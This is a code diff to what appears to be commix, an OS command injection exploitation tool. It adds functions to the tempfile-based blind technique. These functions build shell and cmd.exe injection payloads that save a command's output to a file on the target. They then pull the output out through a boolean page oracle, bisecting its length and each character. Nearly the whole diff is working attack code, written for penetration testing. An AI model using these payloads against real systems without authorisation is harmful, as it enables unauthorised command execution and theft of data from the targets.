@@ -16,6 +16,7 @@ For more see the file 'readme/COPYING' for copying permission.
 from src.utils import settings
 from src.core.controller import checks
 from src.core.techniques.time_based import tb_payloads
+from src.core.techniques.boolean_based import bb_payloads
 
 """
 The "tempfile-based" technique on Semiblind OS Command Injection.
@@ -452,5 +453,100 @@ def fp_result_alter_interpreter(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_
     payload = checks.terminate_payload(payload, separator)
 
   return checks.sanitize_payload_newlines(payload)
+
+"""
+Everything below reads the same created file back through a calibrated oracle instead of a delay -
+the file this technique already writes to and reads from, asked about the way the boolean-based
+technique asks about a command's output, since a page that already tells true from false can tell
+this apart for free where a delay would otherwise be paid for it. On Windows the same question is
+asked the way the boolean-based technique asks a Windows target one: cmd.exe hands no exit status
+back either way, so 'bb_payloads' is reused directly, pointed at 'type FILE' in place of the
+command it would otherwise re-run.
+"""
+
+"""
+Whether this separator can carry a bare test the way the boolean-based technique asks one - the
+same restriction that technique places on itself, for the same reason.
+"""
+def oracle_supported(separator):
+  return bb_payloads._supported(separator) and separator != "|"
+
+"""
+Write a command's output into the created file once, flattened to one line the same way the
+delay-based reading already flattens it - nothing here asks a question, so nothing here waits.
+"""
+def oracle_write(separator, cmd, OUTPUT_TEXTFILE):
+  if not oracle_supported(separator):
+    return ""
+  if settings.TARGET_OS == settings.OS.WINDOWS:
+    chain = checks.windows_separator(separator)
+    return (chain +
+            settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + windows_cmd_text(cmd) +
+            checks.windows_tail(chain)
+            )
+  var = settings.RANDOM_VAR_GENERATOR
+  payload = (separator +
+            var + "=" + settings.CMD_SUB_PREFIX + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator +
+            " " + flattened_file_text(OUTPUT_TEXTFILE) + settings.CMD_SUB_SUFFIX + separator +
+            "echo \"" + trimmed_output_text() + "\" >" + OUTPUT_TEXTFILE
+            )
+  return checks.terminate_payload(payload, separator)
+
+"""
+A question with a known answer, for telling whether this target's own oracle can tell a length
+that matches from one that does not - calibration for the created file, in the same shape the
+boolean-based technique calibrates itself with.
+"""
+def oracle_decision(separator, TAG, output_length, OUTPUT_TEXTFILE, holds=True):
+  if not oracle_supported(separator):
+    return ""
+  expected = output_length if holds else output_length + 1
+  if settings.TARGET_OS == settings.OS.WINDOWS:
+    chain = checks.windows_separator(separator)
+    if chain is None:
+      return ""
+    # The write chained at the top level, the same as the delay-based 'decision()' above writes it -
+    # nested inside the probe's own quoting instead, the '&' joining it to the read would be read as
+    # literal text rather than as cmd.exe's own separator.
+    write = chain + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + "'" + TAG + "'"
+    return write + bb_payloads.get_length(checks.WINDOWS_CHAIN, "type " + OUTPUT_TEXTFILE, expected, "-eq")
+  var = settings.RANDOM_VAR_GENERATOR
+  payload = (separator +
+            var + "=" + settings.CMD_SUB_PREFIX + "echo " + TAG + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
+            var + "1=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
+            bb_payloads._decide(separator, str(expected) + " -eq ${#" + var + "1}")
+            )
+  return checks.terminate_payload(payload, separator)
+
+"""
+How many bytes the created file holds, asked as a comparison so that it can be bisected - the file's
+length rather than the command's, read without running the command again.
+"""
+def oracle_get_length(separator, OUTPUT_TEXTFILE, candidate_length, operator="-ge"):
+  if not oracle_supported(separator):
+    return ""
+  if settings.TARGET_OS == settings.OS.WINDOWS:
+    return bb_payloads.get_length(separator, "type " + OUTPUT_TEXTFILE, candidate_length, operator)
+  var = settings.RANDOM_VAR_GENERATOR
+  payload = (separator +
+            var + "=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
+            bb_payloads._decide(separator, "${#" + var + "}" + settings.SINGLE_WHITESPACE + operator + settings.SINGLE_WHITESPACE + str(candidate_length))
+            )
+  return checks.terminate_payload(payload, separator)
+
+"""
+Whether the ordinal of the created file's Nth byte is at or above this one, which is what bisects it
+- indexed straight off the file with 'cut', since a byte on disk needs none of the parameter-
+expansion slicing a live command substitution would. On Windows the same file is re-read and sliced
+in PowerShell instead, the way 'bb_payloads' already slices a re-run command's own output.
+"""
+def oracle_get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, operator="-le"):
+  if not oracle_supported(separator):
+    return ""
+  if settings.TARGET_OS == settings.OS.WINDOWS:
+    return bb_payloads.get_char(separator, "type " + OUTPUT_TEXTFILE, num_of_chars, ascii_char, operator)
+  ordinal = "$(printf '%d' \"'$(cut -c" + str(num_of_chars) + " " + OUTPUT_TEXTFILE + ")\")"
+  payload = separator + bb_payloads._decide(separator, str(ascii_char) + settings.SINGLE_WHITESPACE + operator + settings.SINGLE_WHITESPACE + ordinal)
+  return checks.terminate_payload(payload, separator)
 
 # eof
